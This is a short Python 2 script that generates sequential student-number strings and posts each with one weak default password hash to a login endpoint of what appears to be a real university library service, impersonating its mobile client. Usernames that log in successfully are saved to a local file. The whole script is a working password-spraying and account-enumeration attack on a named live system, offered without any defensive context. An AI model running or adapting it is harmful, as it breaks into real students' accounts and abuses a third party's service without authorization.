#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import time

import requests


 

z=26
x=1
c=1
v=1
b=0
n=0
flag=0
while 1:
    time.sleep(0.01)
    n=n+1
    if n>9:
         b=b+1 
         n=0
         if b>7:
             b=1
             v=v+1
             if v>4:
                 v=1
                 c=c+1
                 if c>8:
                     c=1
                     z=z+1
                     if z>35:
                         break
    
    xh='15'+str(z)+str(x)+str(c)+'0'+str(v)+str(b)+str(n)


    url = 'http://mob.huanghuai.edu.cn/huanghuai/booksLogin'
    headers = {'cache':'60','Cache-Control':'max-age=2592000','Content-Type':'application/x-www-form-urlencoded','Content-Length':'60','Host':'mob.huanghuai.edu.cn','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.9.0'}
    data = {'jszh':'YKT'+str(xh)+'','password':'202cb962ac59075b964b07152d234b70'}
    Soj_session = requests.session()
    res = Soj_session.post(url, data=data, headers=headers)
    nr=res.text
    flag=flag+1   
    print flag
    if '-2' in nr:
        print 'xxx   '+xh
    else:
        print 'vvv   '+xh
        file = open('/Users/Administrator/Documents/xuehao.txt'.decode('utf-8'),'a+')
        file.write('   '+xh+'   ')
        file.close()

